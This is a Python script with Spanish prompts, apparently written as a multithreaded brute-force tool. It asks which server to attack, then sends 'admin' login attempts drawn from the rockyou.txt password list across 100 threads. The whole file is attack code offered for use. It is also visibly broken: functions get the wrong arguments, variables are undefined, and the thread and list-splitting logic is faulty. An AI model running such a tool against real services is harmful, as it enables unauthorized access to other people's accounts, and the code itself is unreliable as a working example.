# /usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import time
import threading


def bruteforce(contrasena,url): 
    with requests.session() as s:
            for lista in cont:
                for contrasena in lista:
                    datos = {'username': 'admin','password':contrasena}
                    peticion = s.post(url,data=datos,timeout=12)
                    
                    if peticion.status_code == 401:
                         return 1
                    elif peticion.status_code == 200:
                        return 0

def abrir_fich(fichero):
    fichero = "rockyou.txt" 
    with open(fichero,"r",encoding="latin1") as fman:
        contador = 0
        numerohilos = 100
        final =  (len(fman.readlines()))
        finalcont =  final//numerohilos
    
    with open(fichero,"r",encoding="latin1") as fman:
        cont = []
        while contador < final:
             for i in range(contador,finalcont):
                 contr = []
                 contr.append(fman.readline().rstrip())
             contador += finalcont
             finalcont += finalcont
             cont.append(contr)
    return cont


class Mi_hilo(threading.Thread):
      def __init__(self):
          self.final = False
          threading.Thread.__init__(self)
      
      def run(self):
          cont = abrir_fich("rockyou.txt")
          valorfunc = bruteforce(url)
          
          while True:
              if self.final:
                  return
              fin = input("Hilo " +  self.n + self.hilos + " final?")
              if valorfunc == 0:
                 for hilo in self.hilos:
                     if hilo != self.hilo:
                        hilo.stop() 
      
      def stop(self):
          # overwrite del metodo stop
          self.final = True
      
      def start(self):
           # overwrite del metodo start
          self.hilos = []
          threading.Thread.start(self)



if __name__ == "__main__":
    servidor = input("¿Qué servidor quieres atacar?")
    url = 'http://' + servidor + '/'

    with open("rockyou.txt","r",encoding="latin1") as fman:
         contador = 0
         numerohilos = 100
         final =  (len(fman.readlines()))
         finalcont =  final//numerohilos
    
    with open("rockyou.txt","r",encoding="latin1") as fman:
        cont = []
        while contador < final:
             for i in range(contador,finalcont):
                 contr = []
                 contr.append(fman.readline().rstrip())
             contador += finalcont
             finalcont += finalcont
             cont.append(contr)

    # [contraseñas[1,2,2,][3,2,4,5]]  

def metodo():
    while True:
          fin = input("final")
          if fin == "f":
             return 

hilos = []

for i in range(100):
    hilos.append(Mi_hilo(target=bruteforce(url)))

for hilo in hilos:
    hilo.start(hilos)